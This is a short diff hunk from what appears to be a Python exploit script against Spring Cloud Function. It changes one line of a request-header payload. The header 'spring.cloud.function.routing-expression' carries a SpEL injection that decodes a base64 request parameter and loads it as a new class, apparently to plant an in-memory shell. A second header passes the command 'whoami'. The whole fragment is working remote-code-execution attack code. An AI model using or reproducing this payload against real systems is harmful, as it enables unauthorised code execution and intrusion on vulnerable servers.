@@ -42,7 +42,7 @@ def Exploit(url):
 
 def Inject(url):
     headers = {
-        "spring.cloud.function.routing-expression": "T(org.springframework.cglib.core.ReflectUtils).defineClass('injectSuper',T(org.springframework.util.Base64Utils).decodeFromString((T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getRequest().getParameter(\"test\"))),T(org.springframework.util.ClassUtils).getDefaultClassLoader())",
+        "spring.cloud.function.routing-expression": "T(org.springframework.cglib.core.ReflectUtils).defineClass('injectSuperNew',T(org.springframework.util.Base64Utils).decodeFromString((T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getRequest().getParameter(\"test\"))),T(org.springframework.util.ClassUtils).getDefaultClassLoader())",
         "Accept-Cache": "whoami",
         "Content-Type": "application/x-www-form-urlencoded",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
